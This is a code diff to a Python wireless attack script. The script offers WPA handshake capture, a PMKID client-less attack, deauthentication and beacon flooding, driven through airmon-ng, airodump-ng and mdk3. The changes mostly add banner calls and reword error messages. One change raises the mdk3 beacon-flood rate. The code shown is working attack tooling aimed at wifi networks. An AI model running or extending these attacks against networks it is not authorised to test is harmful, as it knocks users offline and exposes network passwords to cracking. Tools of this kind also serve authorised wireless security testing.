@@ -157,6 +157,7 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["clear"])
     # HandShake Attack Mode
     if attack_mode == "Handshake":
+        script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
         # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
@@ -207,9 +208,10 @@ def attack_func(network_interface, attack_mode):
     # PKMID Attack Mode
     elif attack_mode == "PKMID":
         subprocess.run(["clear"])
+        script_banner()
         time.sleep(1)
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        get_colours("[*] Starting the PKMID Client-Less ATTACK", "magenta")
+        get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(100)} Seconds", 'blue')
         get_colours("", "yellow")
@@ -248,6 +250,7 @@ def attack_func(network_interface, attack_mode):
             quit_program()
     # Deauthentication Attack Mode
     elif attack_mode == "DAuth":
+        script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
         access_name = input(Fore.YELLOW + "Access point name: ")
@@ -291,10 +294,11 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "BFlood":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         os.system('clear')
+        script_banner()
         get_colours("[*] Starting the attack...", 'blue')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
-            f"xterm -hold -e sudo mdk3 {network_interface}mon b -s 500")
+            f"xterm -hold -e sudo mdk3 {network_interface}mon b -a -g -s 1000")
         quit_program()
 
 
@@ -319,21 +323,21 @@ def check_parms():
                     check_interface_exist = subprocess.run(["ip", "a"], capture_output=True, text=True)
                     check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
                     if sys.argv[2] not in check_interface_exist.stdout:
-                        get_colours("\nInvalid Network Interface name (Ej: wlan0 / eth0)", "red")
+                        get_colours("\n[!] Invalid Network Interface name (Ej: wlan0 / eth0)", "red")
                         print(Fore.WHITE)
                     elif sys.argv[4] not in check_attack_mode:
-                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
+                        get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                         print(Fore.WHITE)
                     else:
                         check_deps()  # Check for necessary program to run this script.
                 else:
-                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
+                    get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                     print(Fore.WHITE)
             else:
-                get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
+                get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                 print(Fore.WHITE)
         else:
-            get_colours("\nSelect a valid Interface (wlan0 / eth0)", "red")
+            get_colours("\n[!] Select a valid Interface (wlan0 / eth0)", "red")
             print(Fore.WHITE)
     else:
         menu_panel()
